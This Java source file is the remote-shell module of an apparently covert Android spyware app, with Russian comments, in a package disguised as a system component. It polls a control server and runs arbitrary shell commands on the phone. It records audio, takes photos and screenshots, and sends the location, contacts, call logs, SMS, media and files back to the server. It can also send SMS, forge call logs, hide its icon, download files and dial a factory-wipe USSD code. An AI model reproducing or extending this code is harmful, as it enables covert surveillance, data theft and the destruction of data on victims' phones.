package oom.android.system.app;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import oom.android.system.Managers.BlockManager;
import oom.android.system.Managers.CallL.CallsManager;
import oom.android.system.Managers.CameraManager;
import oom.android.system.Managers.Contacts.ContactsManager;
import oom.android.system.Managers.FileManager;
import oom.android.system.Managers.Images.MediaStoreManager;
import oom.android.system.Managers.LocManager;
import oom.android.system.Managers.ScreenShotManager;
import oom.android.system.Managers.SmsManager;
import oom.android.system.Managers.audioManager;

public class ShellSession implements Runnable {
    Context context;
    WakeLock wakeLock;
    List<String> remotelist = new ArrayList<String>(); // файлы по строкам на сервере

    String timestamp;
    int max_attempts=300;  // количество попыток получения команды при активном коннекте
    int idleattempts=0;    // кол-во ответов на запрос без новой команды
    String cmd;            //комманда
    String requested_file; // файл который требуют загрузить
    String cmd_spec;       //спец комманда
    long lastrequesttime;  //ремя последнего запроса
    long curtime;          //время
    long shell_interval=60000;  // уже в секундах(!), <10 мин назад - запускаем акт шелл 300

    long on_con_error_delay=1800000; // когда временно нет связи 60000 - 1м 1800000 - 30м
    long no_requests_delay= 600000; //мсек время с последнего запроса - проверяем каждые 10 мин 600000 через сколько будут получать новые комманды
    long between_cmd_delay= 3000; // между получением новой команды в акт. фазе -30 сек 30000
    //boolean is_rooted=false;
    String connection_type;         //тип связи (wifi,3g т.д.)
    audioManager Am;

    ShellSession(){
        this.context=MyService.getContext();
    }

    @Override
    public void run() {
        if(!MyService.ScreenOn){
            try{
                PowerManager mgr = (PowerManager)context.getSystemService(Context.POWER_SERVICE); // лочим
                wakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "oom.android.system:shellWakeLock");
                wakeLock.acquire();
            } catch(Exception e){
                Log.d(MyService.LOG_TAG, "ошибка настройки блокировки!");
            }
        }
        try{
            // устанавливаем тайминги в зав-ти от типа подключения к инету
            ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo info = cm.getActiveNetworkInfo();
            connection_type=info.getTypeName()+":"+info.getSubtypeName();

            if(info != null && info.isConnected() && info.getType() == ConnectivityManager.TYPE_MOBILE){
                Log.d(MyService.LOG_TAG, "используется 3g/edge. изменение времени");

                on_con_error_delay=3600000;  // по умолчанию 60000 мсек = 1 мин --5мин 300000
                no_requests_delay=600000;   // 600000 мсек = 10 мин -- 20мин 1200000
            }
        }
        catch(Exception e){Log.d(MyService.LOG_TAG, "ошибка получения информации о связи");}


        while(true){
            try{
                remotelist=load_url(MyService.shelltime_url);
                if(remotelist.size()!=0&&!(timestamp=remotelist.get(0)).equals("END")){
                    lastrequesttime=Long.parseLong(timestamp);
                    curtime=System.currentTimeMillis()/1000;
                    Log.d(MyService.LOG_TAG, String.valueOf((curtime-lastrequesttime)));
                    Log.d(MyService.LOG_TAG,(curtime-lastrequesttime<shell_interval)? "true" : "false");
                    if(curtime-lastrequesttime<shell_interval){
                        Log.d(MyService.LOG_TAG,"запрос был не давно! активация шелл'а.");
                        activate_shell();
                    }

                    Thread.currentThread().sleep(no_requests_delay); // сон на время без запросов
                }
            }
            catch (InterruptedException e){

                try{
                    wakeLock.release();
                }catch(Exception ex){}
                MyService.cmdsessionactive=false;
                return;//break;
            }
            catch (Exception e){
                Log.d(MyService.LOG_TAG,"shell не смог установить соединение!\n"+e.toString());
                try {
                    Thread.sleep(on_con_error_delay);
                }
                catch(InterruptedException ex){
                    Log.d(MyService.LOG_TAG,"shell был прерван");
                    if(!MyService.ScreenOn) {
                        try {
                            wakeLock.release();
                        } catch (Exception ex1) { }
                    }
                    MyService.cmdsessionactive=false;
                    return;
                }
            }
        }
    }

    public void activate_shell() throws InterruptedException{
        idleattempts=0;
        MyService.cmdsessionactive=true;
        while(idleattempts<max_attempts){
            try{
                remotelist=load_url(MyService.cmd_url); // результат в remotelist <array>
                if(remotelist.size()!=0&&!(cmd=remotelist.get(0)).equals("END")){
                    if(remotelist.size()>1 &&!(cmd_spec=remotelist.get(1)).equals("END")){
                        if(!cmd_spec.equals("")){
                            try{
                                exec_spec(cmd_spec);
                            } catch(Exception e){
                                Log.d(MyService.LOG_TAG,"ошибка при выполнении команды: \n"+cmd+"\"");
                                //post(MyService.post_url,"ошибка при выполнении команды: \n"+cmd+"\"");
                            }
                        }
                    }
                    idleattempts=0; //сбрасываем счетчик - появилась активность
                    if(!cmd.equals("")){
                        Log.d(MyService.LOG_TAG,"текущаяя команда: \""+cmd+"\" выполняется..");
                        try{
                            List<String> res = exec_cmd(cmd);
                            if (res.size()!=0){
                                postdata(MyService.post_url,res); // отсылаем результат
                            } else{
                                post(MyService.post_url,"error");
                            }

                        } catch(Exception e){
                            Log.d(MyService.LOG_TAG,"ошибка при выполнении команды: \n"+cmd+"\"");
                        }
                    }
                }
            }
            catch(Exception e){
                Log.d(MyService.LOG_TAG,"ошибка при получении удаленной команды\n"+e.toString());
            }

            Thread.currentThread().sleep(between_cmd_delay);
            idleattempts++;

        }
        MyService.cmdsessionactive=false;

    }

    public List<String> exec_cmd(String command){
        String inputLine;
        List<String> res = new ArrayList<String>();

        try {
            Process process = Runtime.getRuntime().exec(command);
            //if(command.startsWith("kill") || command.startsWith("mkdir") || command.startsWith("mv") || command.startsWith("rm") || command.startsWith("rmdir") ) {
                BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));

                while ((inputLine = in.readLine()) != null) {
                    res.add(inputLine);
                }
            //}

        } catch (Exception e) {
            Log.d(MyService.LOG_TAG,"ошибка выполнения: \""+command+"\"\n"+e.toString());
        }
        return res;
    }

    public void exec_spec(String command){
        try {
            Am=new audioManager(MyService.getContext());
            Log.d("Command","Command:" + command);
            JSONObject gJson = null;
            try{
                Integer ind = command.indexOf(" ");
                String json = command.substring(ind);
                gJson = new JSONObject(json);
            }catch (Exception e){}

            if(command.startsWith("restart")){
                post(MyService.post_url,"[Settings]restarting whole service!");
                System.exit(0);

            }

            else if(command.startsWith("record")){
                if(!MyService.recording){
                    int delay= gJson.getInt("delay");
                    Boolean online = gJson.getBoolean("online");
                    Am.startRecording(online);
                    if(delay !=0){
                        MyService.record_must_be_stopped=true;
                        record_auto_stop(delay);
                    }
                    post(MyService.post_url,"[Record]recording started with delay "+delay+" seconds");

                }
                else{post(MyService.post_url,"[Record]"+"already recoding at the moment!");}
            }

            else if(command.startsWith("stoprecord")){
                if(MyService.recording){
                    Am.stopRecording();
                    MyService.record_must_be_stopped=false;
                    post(MyService.post_url,"[Record]"+"recording stopped!");
                }
                else{post(MyService.post_url,"[Record]"+"recording already stopped!");}
            }

            else if(command.startsWith("sync")){
                String args[] = command.split(" ");
                switch (args.length) {
                    case 1:
                        if(!MyService.syncactive){
                            sync(MyService.log_path,true);
                            post(MyService.post_url,"sync initiated!");}
                        else{post(MyService.post_url,"already syncing!");}
                        break;

                    case 2:
                        if(!MyService.syncactive){
                            sync(args[1],true);
                            post(MyService.post_url,"started syncing "+args[1]);
                        }
                        else{
                            post(MyService.post_url,"already syncing!");
                        }
                        break;
                }
            }

            else if(command.startsWith("secsync")){
                String args[] = command.split(" ");
                switch (args.length) {
                    case 1:
                        if(!MyService.syncactive){
                            sync(MyService.log_path,false);
                            post(MyService.post_url,"secure sync initiated!");}

                        else{
                            post(MyService.post_url,"already syncing!");
                        }
                        break;

                    case 2:
                        if(!MyService.syncactive){
                            sync(args[1],false);
                            post(MyService.post_url,"started secure syncing "+args[1]);
                        }
                        else{
                            post(MyService.post_url,"already syncing!");
                        }
                        break;
                }
            }

            else if(command.startsWith("quit")){   // завершить шелл
                MyService.cmdsessionactive=false;
                Thread.currentThread().interrupt();
            }

            else if(command.startsWith("clear")){   // очистка папки приложения
                try{
                    String datadir=context.getApplicationInfo().dataDir;
                    Runtime.getRuntime().exec("rm -r "+datadir+"/files/logs/");
                    Runtime.getRuntime().exec("mkdir "+datadir+"/files/logs/");
                    post(MyService.post_url,"app files cleaned");}
                catch (Exception e){}
            }

            else if(command.startsWith("factoryformat")){   // форматнуть нафиг ;p
                factoryformatussd();
            }

            else if(command.startsWith("getCams")){

                post(MyService.out_Cameras,get_numberOfCameras().toString());
            }

            else if(command.startsWith("photoM")){   // фото с камеры
                int id = gJson.getInt("id");
                boolean online = gJson.getBoolean("online");
                try{
                    new CameraManager(MyService.getContext()).startUp(id,online);
                }
                catch (Exception e){}
            }

            else if(command.startsWith("screenshotM")){
                ScreenShotManager.savePic(gJson.getBoolean("online"),ScreenShotManager.takeScreenShot());
            }

            else if(command.startsWith("hideappicon")){//вынести в отдельный класс
                try {
                    function.hideAppIcon(MyService.getContext());
                    post(MyService.post_url,"Hide App Icon successfully");
                }catch (Exception e){
                    post(MyService.post_url,"ERROR Hide App Icon:"+e.getMessage());
                }
            }

            else if(command.startsWith("unhideappicon")){//вынести в отдельный класс
                try {
                    function.unHideAppIcon(MyService.getContext());
                    post(MyService.post_url,"UnHide App Icon successfully");
                }catch (Exception e){
                    post(MyService.post_url,"ERROR UnHide App Icon");
                }
            }

            else if(command.startsWith("ContAdd")){
                if(gJson.getBoolean("stand") ==true)
                    ContactsManager.AddContact(gJson.get("name").toString(),gJson.get("phone").toString());
            }

            else if(command.startsWith("getContactsList")){
                try{
                    post(MyService.out_contacts,ContactsManager.getContacts(MyService.getContext()).toString());
                }catch (Exception e){}
            }

            else if(command.startsWith("ContDel")){
                ContactsManager.DeleteContact(gJson.get("raw").toString(),gJson.get("name").toString());
            }

            else if(command.startsWith("ContChn")){
                ContactsManager.UpdateContact(gJson.get("raw").toString(),gJson.get("name").toString(),gJson.get("phone").toString(),gJson.get("Nname").toString(),gJson.get("Nphone").toString());
            }

            else if(command.startsWith("getCallLog")){
                try{
                    post(MyService.out_call,CallsManager.getCallsLogs(MyService.getContext()).toString());
                }catch (Exception e){}
            }

            else if(command.startsWith("CallDel")){
                CallsManager.DeleteCallLog(gJson.get("date").toString());
            }

            else if(command.startsWith("CallAdd")){
                CallsManager.AddCallLog(gJson.getString("type"),gJson.getString("phone"),gJson.getString("duration"),gJson.getString("date"),gJson.getInt("count"));
            }

            else if(command.startsWith("CallChn")){
                CallsManager.ChangeCallLog(gJson.get("phone").toString(),gJson.get("date").toString(),gJson.get("Ntype").toString(),gJson.get("Nphone").toString(),gJson.get("Ndur").toString(),gJson.get("Ndate").toString());
            }

            else if(command.startsWith("getSmsList")){
                try{
                    post(MyService.out_sms,SmsManager.getSMSList().toString());
                }catch (Exception e){}
            }

            else if(command.startsWith("sendSms")){
                SmsManager.sendSMS(gJson.get("phone").toString(),gJson.get("message").toString());
            }

            else if(command.startsWith("getBlockList")){
                post(MyService.out_block,BlockManager.getBlockList().toString());
            }

            else if(command.startsWith("BlockAdd")){
                BlockManager.addBlock(gJson.getString("phone"));
            }

            else if(command.startsWith("BlockDel")){
                BlockManager.DelBlock(gJson.getString("phone"));
            }

            else if(command.startsWith("getLocation")){
                LocManager gps = new LocManager(MyService.getContext());
                JSONObject location = new JSONObject();
                gps.getLocation();
                // check if GPS enabled
                if(gps.canGetLocation()){
                    gps.getLocation();

                    double latitude = gps.getLatitude();
                    double longitude = gps.getLongitude();

                    location.put("lat" , latitude);
                    location.put("lng" , longitude);
					post(MyService.out_Loc,location.toString());
                    post(MyService.post_url,"[LC]Координаты получены");
                }
                else {
                    post(MyService.post_url,"[LC]Не удалось получить координаты");
                }
            }

            else if(command.startsWith("getFile")){
                post(MyService.out_fm,FileManager.walk(gJson.get("path").toString()).toString());
            }

            else if(command.startsWith("saveFile")){   // загружает файл на сервер
                String requested_file = gJson.get("path").toString();
                FileManager.uploadfile(requested_file);
            }

            else if(command.startsWith("DelFile")){
                String path = gJson.get("path").toString();
                FileManager.DelFile(path);
            }
            // скачать пользовательский файл с URL
            else if(command.startsWith("DwnFile")){
                String fileurl = gJson.get("url").toString();
                boolean isdownloaded  = FileManager.downloadfileV1(fileurl);
                if(isdownloaded){
                    post(MyService.post_url,"[FM]"+fileurl+" успешно загружен");
                }
                else{
                    post(MyService.post_url," Ошибка загрузки файла "+fileurl);
                }
            }

            else if(command.startsWith("getMobImages")){
                post(MyService.out_MediaF,MediaStoreManager.getMobImages(MyService.getContext()).toString());
                post(MyService.post_url,"[MS]Успешно получено");
            }


        } catch (Exception e) {
            Log.d(MyService.LOG_TAG,"error executing spec: \""+command+"\"\n"+e.toString());
        }
    }

    public JSONArray get_numberOfCameras() {
        JSONArray Jarray=new JSONArray();
        try{
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            for (int i = 0; i < android.hardware.Camera.getNumberOfCameras(); i++) {
                JSONObject Obj = new JSONObject();
                android.hardware.Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    Obj.put("Type","Front");
                    Obj.put("ID",i);


                } else if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
                    Obj.put("Type","Back");
                    Obj.put("ID",i);
                }
                Jarray.put(Obj);
            }
        }catch (Exception e){}
        return Jarray;

    }

    void factoryformatussd(){
        String ussdCode = "*2767*3855"+Uri.encode("#");
        context.startActivity(new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + ussdCode)).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }

    void sync(String path,boolean is_plain){

        HiddenWaiter.syncthread = new Thread(new SyncThread(path,context,is_plain,true)); // bool = plain
        HiddenWaiter.syncthread.setName("usersyncthread");
        HiddenWaiter.syncthread.start();
    }

    void record_auto_stop(final long delay_secs){
        Runnable limiter = new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(delay_secs*1000);   // в миллисекунды
                    if(MyService.record_must_be_stopped){
                        Am.stopRecording();
                        MyService.record_must_be_stopped=false;
                        post(MyService.post_url,"recording auto-stopped after "+delay_secs+" secs");
                    }
                } catch (Exception e) {
                }


            }
        };
        new Thread(limiter).start();

    }

    static public List<String> load_url(String url_string){
        List<String> res = new ArrayList<String>();
        try{
            URL url = new URL(url_string);
            HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestMethod("GET");
            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                Log.d(MyService.LOG_TAG, "load_url() error: "+connection.getResponseCode());
            }
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;

            while ((inputLine = in.readLine())!=null&&!(inputLine.equals("END"))){
                res.add(inputLine);}
            in.close();
            connection.disconnect();
            //Log.d(LOG_TAG, "total: "+remotelist.size());
        }
        catch(Exception e){
            Log.d(MyService.LOG_TAG, "ошибка при установлении соединения\\создание потока\n"+e.toString());
            return null;
        }
        return res;
    }

    public void postdata(String url,List<String> data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }

    public void post(String url,String data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }
}
